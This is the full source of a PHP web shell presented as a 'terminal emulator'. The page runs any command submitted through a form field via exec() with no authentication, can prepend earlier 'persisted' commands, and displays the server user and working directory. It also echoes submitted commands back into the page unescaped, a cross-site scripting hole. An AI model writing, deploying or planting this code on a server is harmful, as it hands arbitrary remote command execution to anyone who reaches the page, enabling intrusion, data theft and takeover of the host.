<?php
	
	session_start();
	
	if (isset($_POST['clear']) AND $_POST['clear'] == 'clear') {
		session_unset();
	}
	
	if ( ! isset($_SESSION['persist_commands']) OR ! isset($_SESSION['commands'])) {
		$_SESSION['persist_commands'] = array();
		$_SESSION['commands'] = array();
		$_SESSION['command_responses'] = array();
	}
	
	$previous_commands = '';
	
	if (isset($_SESSION['persist_commands'])) {
		foreach ($_SESSION['persist_commands'] as $index => $persist) {
			if ($persist) {
				$previous_commands .= $_SESSION['commands'][$index] . '; ';
			}
		}
	}
	
	if (isset($_POST['command'])) {
		if ($_POST['command'] != '') {
			exec($previous_commands . $_POST['command'], $response);
		} else {
			$response = array();
		}
		if (isset($_POST['persist']) AND $_POST['persist'] == 'true') {
			array_push($_SESSION['persist_commands'], TRUE);
		} else {
			array_push($_SESSION['persist_commands'], FALSE);
		}
		array_push($_SESSION['commands'], $_POST['command']);
		array_push($_SESSION['command_responses'], $response);
	}
	
	$previous_commands = $_POST['previous_commands'] . $_POST['command'];
	
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>PHP Terminal Emulator</title>
	<style type="text/css">
		* {
			margin: 0;
			padding: 0;
		}
		body {
			background-color: #000000;
			color: #00FF00;
			font-family: monospace;
			font-weight: bold;
			font-size: 12px;
			text-align: center;
		}
		input, textarea {
			color: inherit;
			font-family: inherit;
			font-size: inherit;
			font-weight: inherit;
			background-color: inherit;
			border: inherit;
		}
		.content {
			width: 80%;
			min-width: 400px;
			margin: 40px auto;
			text-align: left;
			overflow: auto;
		}
		.terminal {
			border: 1px solid #00FF00;
			height: 500px;
			position: relative;
		}
		.terminal .bar {
			border-bottom: 1px solid #00FF00;
			padding: 2px;
			white-space: nowrap;
			overflow: hidden;
		}
		.terminal .commands {
			padding: 2px;
			padding-right: 0;
		}
		.terminal #command {
			width: 90%;
		}
		.terminal .colorize {
			color: #0000FF;
		}
		.terminal #persist_button {
			float: right;
			border-width: 1px 0 1px 1px;
			border-style: solid;
			border-color: #00FF00;
		}
	</style>
</head>
<body>
	<div class="content">
		<div class="terminal" onclick="document.getElementById('command').focus();">
			<div class="bar">
				<?php echo `whoami`, ' - ', `pwd`; ?>
			</div>
			<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" class="commands" id="commands">
				<input type="hidden" name="persist" id="persist" />
				<?php if (isset($_SESSION['commands'])) { ?>
				<div>
					<?php foreach ($_SESSION['commands'] as $index => $command) { ?>
					<pre><?php echo '$ ', $command, "\n"; ?></pre>
					<?php foreach ($_SESSION['command_responses'][$index] as $value) { ?>
					<pre><?php echo htmlentities($value), "\n"; ?></pre>
					<?php } ?>
					<?php } ?>
				</div>
				<?php } ?>
				$ <input type="text" name="command" id="command" />
				<input type="button" value="Persist" onfocus="this.style.color='#0000FF';" onblur="this.style.color='';" onclick="persist_command();" id="persist_button" />
			</form>
			<script type="text/javascript">
				document.getElementById('command').select();
				
				function persist_command() {
					document.getElementById('persist').value='true';
					document.getElementById('commands').submit();
				}
			</script>
		</div>
	</div>
	<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
		<input type="hidden" name="clear" value="clear" />
		<input type="submit" value="Clear" onfocus="this.style.color='#0000FF';" onblur="this.style.color='';" />
	</form>
</body>
</html>












